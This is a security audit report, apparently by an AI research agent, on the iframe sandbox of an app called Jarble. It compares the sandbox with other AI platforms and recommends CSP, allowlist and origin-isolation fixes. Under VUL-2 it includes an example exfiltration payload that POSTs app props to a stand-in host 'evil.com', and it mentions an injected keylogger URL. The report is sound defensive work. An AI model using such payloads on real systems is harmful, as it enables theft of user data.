# Report 12: Sandbox & Iframe Security Deep Dive

**Agent**: sandbox-security-researcher
**Status**: COMPLETE
**Date**: 2026-02-27

## Executive Summary

Comprehensive security analysis of Jarble's `CanvasSandbox.tsx` iframe implementation, compared against Claude Artifacts (`claudeusercontent.com`), ChatGPT Apps SDK (`oaiusercontent.com`), and MCP Apps specification. Identified 8 vulnerabilities in Jarble's current implementation, with the **wide-open CSP** being the most critical.

**Key finding**: Jarble's sandbox CSP (`default-src * 'unsafe-inline' 'unsafe-eval'`) is essentially no CSP at all. A single change to tighten this would close the most critical vulnerabilities immediately.

---

## 1. Claude Artifacts Security Model

### Domain Isolation: `claudeusercontent.com`

Claude uses a completely separate domain for all artifact content. Because the iframe origin is `https://www.claudeusercontent.com` while the host is `https://claude.ai`, the browser's Same-Origin Policy provides a hard isolation boundary:

- Iframe **cannot** access `window.parent` DOM, cookies, localStorage of Claude.ai
- `allow-same-origin` is safe because origins differ
- Cookies set by Claude.ai are completely invisible to the iframe

### PostMessage Bridge

- Parent sends artifact code/props to iframe via postMessage
- `window.claude` API inside iframe provides `window.claude.complete()` for callback to LLM
- Parent validates `e.origin` to ensure messages come from `claudeusercontent.com`
- Messages serialized via structured clone (no function passing)

### Key Libraries

- **React Runner** for dynamic React execution in sandbox
- **DOMPurify** for HTML sanitization
- MIME type validation: `application/vnd.ant.react`, `text/html`, `image/svg+xml`

---

## 2. ChatGPT Apps SDK Security

### Architecture

- Widgets run in sandboxed iframes on `web-sandbox.oaiusercontent.com`
- Each app gets a unique origin via `_meta.ui.domain`
- Subframes blocked by default, allowed only via `_meta.ui.csp.frameDomains`

### `window.openai.*` Bridge API

| Method | Purpose |
|--------|---------|
| `window.openai.toolInput` | Read tool call arguments |
| `window.openai.toolOutput` | Access structured tool results |
| `window.openai.callTool(name, args)` | Invoke another MCP tool |
| `window.openai.sendFollowUpMessage(...)` | Post follow-up message |
| `window.openai.setWidgetState(state)` | Persist UI state |
| `window.openai.uploadFile(file)` | Accept image uploads |
| `window.openai.requestModal(...)` | Spawn host-owned modal |
| `window.openai.openExternal(...)` | Open vetted external links |

### Restricted Capabilities

Explicitly denied: `window.alert/prompt/confirm`, `navigator.clipboard`, unrestricted iframes, unvetted network requests.

### Protocol

JSON-RPC 2.0 over `postMessage` with `ui/*` methods and notifications.

---

## 3. MCP Apps Iframe Security

### Architecture

- Mandatory sandboxed iframe rendering
- JSON-RPC 2.0 messages over `window.postMessage`
- UI resources declared as `ui://` URIs
- Content type: `text/html;profile=mcp-app`

### CSP Configuration

Apps declare CSP via `_meta.ui.csp`:
- `connectDomains` — network request origins
- `resourceDomains` — static asset origins
- `frameDomains` — nested iframe permissions
- `baseUriDomains` — allowed base URIs

**Secure default** when CSP omitted:
```
default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'
```

Hosts **MUST NOT** allow undeclared domains.

---

## 4. Browser Iframe Security Best Practices (2025-2026)

### Sandbox Attribute Guide

| Attribute | Risk Level | Notes |
|-----------|-----------|-------|
| `allow-scripts` | **Required** | Needed for interactive content |
| `allow-popups` | Low | User-triggered only |
| `allow-same-origin` | **DANGEROUS** with `allow-scripts` | Only safe when origins differ |
| `allow-forms` | Medium | Can redirect |
| `allow-top-navigation` | **DANGEROUS** | Enables phishing |
| `allow-downloads` | Medium | Can trigger downloads |

**Critical rule**: Never combine `allow-scripts` and `allow-same-origin` on same-origin content.

### Cross-Origin Isolation Headers

| Header | Value | Purpose |
|--------|-------|---------|
| `Cross-Origin-Embedder-Policy` | `require-corp` | Prevents loading cross-origin resources without opt-in |
| `Cross-Origin-Opener-Policy` | `same-origin` | Isolates browsing context groups |

### Shadow DOM vs Iframe

Shadow DOM provides **style encapsulation** but **not security isolation**. For AI-generated content with JavaScript, iframes are the only viable browser-native isolation.

---

## 5. Jarble's Current Sandbox Audit

### Current Implementation

File: `CanvasSandbox.tsx`

```html
<iframe
  srcDoc={srcdoc}
  sandbox="allow-scripts allow-popups"
  style={...}
/>
```

CSP inside srcdoc (line 94):
```
default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; frame-src *
```

PostMessage bridge:
- Parent → iframe: `{ type: "jarble:props", props }`
- Iframe → parent: `{ type: "jarble:action", action, payload }`
- All calls use `"*"` as target origin

### Vulnerability Analysis

#### VUL-1: Overly Permissive CSP (HIGH)

**Location**: `CanvasSandbox.tsx`, line 94

`default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; frame-src *` is essentially no CSP. Allows: load resources from any origin, execute `eval()`, embed nested iframes from any origin.

**Risk**: Sandbox can exfiltrate data to any external server, load malicious scripts, create nested iframes that may not inherit sandbox restrictions.

#### VUL-2: Unrestricted Network Access (HIGH)

Sandbox can `fetch()` and `XMLHttpRequest` to any URL. Attack scenario:

```json
{
  "component": "sandbox",
  "props": {
    "html": "<div></div>",
    "js": "fetch('https://evil.com/steal', { method: 'POST', body: JSON.stringify(window.__JARBLE_PROPS__) })"
  }
}
```

#### VUL-3: Wildcard PostMessage Target Origin (MEDIUM)

All `postMessage` calls use `"*"`. Parent-side handler does check `e.source === iframeRef.current?.contentWindow` (partial mitigation), but iframe-side listener does **not** validate `e.origin`.

#### VUL-4: No Input Sanitization (MEDIUM)

`sanitizeHtmlProp()` only extracts `<script>` tags. No DOMPurify. Since sandboxed without `allow-same-origin`, XSS is confined to sandbox — but JS can still make network requests and create phishing UIs.

#### VUL-5: Same-Origin Serving (LOW-MEDIUM)

Uses `srcdoc` (same origin). Without `allow-same-origin`, gets opaque origin — safe today. But if `allow-same-origin` is ever added, sandbox becomes **completely bypassable**. Latent vulnerability.

#### VUL-6: No Resource Limits (LOW)

No restrictions on CPU (infinite loops), memory (multi-GB arrays), network requests. Only mitigation is the "Stop" button requiring user action.

#### VUL-7: Library URL Injection (MEDIUM)

Only validation: `url.startsWith("http")`. An LLM can inject `https://evil.com/keylogger.js`.

#### VUL-8: No Next.js Security Headers (LOW)

No `Content-Security-Policy`, `X-Frame-Options`, `Permissions-Policy`, or `Cross-Origin-Opener-Policy` configured.

---

## 6. Domain-Level Isolation Plan

### Architecture for `sandbox.jarble.ai`

**Option A: Static Sandbox Shell + PostMessage** (Recommended)

1. Deploy minimal HTML shell to `sandbox.jarble.ai`
2. Parent on `app.jarble.ai` creates `<iframe src="https://sandbox.jarble.ai/shell.html" sandbox="allow-scripts allow-same-origin">`
3. Because origins differ, `allow-same-origin` is safe
4. Parent sends HTML/CSS/JS content via postMessage
5. Shell renders content into its DOM

**Advantages**:
- Hard origin isolation enforced by browser
- `allow-same-origin` safe (different domains)
- CSP controlled server-side
- Parent's cookies/tokens completely invisible

**PostMessage across origins**:
```javascript
// Parent → specific origin
iframeRef.current.contentWindow.postMessage(
  { type: "jarble:props", props },
  "https://sandbox.jarble.ai"
);

// Iframe → specific origin
parent.postMessage(
  { type: "jarble:action", action, payload },
  "https://app.jarble.ai"
);

// Parent validates
if (e.origin !== "https://sandbox.jarble.ai") return;
```

**Performance**: ~150-200ms first-load overhead (DNS + TLS), negligible thereafter.

---

## 7. Content Sanitization

### Library Comparison

| Feature | DOMPurify | sanitize-html | rehype-sanitize |
|---------|-----------|---------------|-----------------|
| Size | 6.6KB | 66.8KB | ~15KB |
| Downloads | 27M+/week | 7.7M+/week | ~1M/week |
| Written by | Cure53 (security researchers) | General purpose | Unified.js |
| Bypass resistance | Excellent | Some documented | Good |

**Recommendation**: DOMPurify for all non-sandbox HTML sanitization.

### Where to Sanitize

- **Non-sandbox components** (card, data_table): Sanitize all string props that render as HTML with DOMPurify
- **Sandbox component**: Do NOT sanitize — the point is to execute arbitrary code safely. Security via iframe boundary + CSP.

---

## Security Hardening Checklist

### Priority 1: Critical (Immediate)

#### 1.1 Tighten CSP Inside srcdoc

```javascript
const csp = [
  "default-src 'none'",
  `script-src 'unsafe-inline' 'unsafe-eval' ${safeLibs.map(u => new URL(u).origin).join(' ')}`,
  "style-src 'unsafe-inline'",
  "img-src * data: blob:",
  "font-src * data:",
  "media-src * data: blob:",
  `connect-src ${safeLibs.map(u => new URL(u).origin).join(' ')}`,
  "frame-src 'none'",
  "worker-src blob:",
].join("; ");
```

Eliminates data exfiltration (VUL-1, VUL-2) and nested iframe escape.

#### 1.2 Library URL Allowlist

```typescript
const TRUSTED_CDN_ORIGINS = new Set([
  "https://cdn.jsdelivr.net",
  "https://cdnjs.cloudflare.com",
  "https://unpkg.com",
  "https://cdn.skypack.dev",
  "https://esm.sh",
  "https://threejs.org",
  "https://d3js.org",
  "https://cdn.plot.ly",
]);
```

#### 1.3 Validate PostMessage Origins

Parent-side already checks `e.source` ✅. No change needed for srcdoc approach.

### Priority 2: High (1-2 Weeks)

- **2.1**: Add security headers to `next.config.ts` (`X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy`)
- **2.2**: Add watchdog timer inside sandbox (30s timeout kills execution)
- **2.3**: DOMPurify for non-sandbox component string props

### Priority 3: Medium (1 Month)

- **3.1**: Domain-level isolation (`sandbox.jarble.ai`)
- **3.2**: API-side block validation (library URL allowlist, content size limits in `uiBlockParser.ts`)
- **3.3**: Add `allow` attribute restricting browser APIs (camera, microphone, geolocation, payment)

### Priority 4: Low (When Feasible)

- Content hash logging for audit trail
- Rate limiting sandbox creation (max 5 per session)
- PostMessage traffic monitoring in dev mode

---

## Comparison: Jarble vs Industry

| Security Feature | Jarble (Current) | Claude | ChatGPT | MCP Apps |
|---|---|---|---|---|
| Domain isolation | No (srcdoc) | Yes | Yes | Host-dependent |
| Sandbox attribute | `allow-scripts allow-popups` | Undocumented | Undocumented | Mandatory |
| CSP | `default-src *` ❌ | DOMPurify + server CSP | Per-app CSP | Secure defaults |
| PostMessage validation | Source check only | Origin validation | JSON-RPC typed | JSON-RPC |
| Network restrictions | None ❌ | Domain-scoped | Per-app | Per-app |
| Library loading | Any URL ❌ | Allowlisted | Via CSP | Via CSP |
| Nested iframes | Allowed ❌ | Blocked | Blocked | Blocked unless declared |
| Bridge API | Untyped `jarble.send()` | `window.claude.*` | `window.openai.*` (rich) | JSON-RPC |

**Largest gap**: Wide-open CSP + no network restrictions. Fixing CSP (Priority 1.1) immediately closes the most critical vulnerabilities.
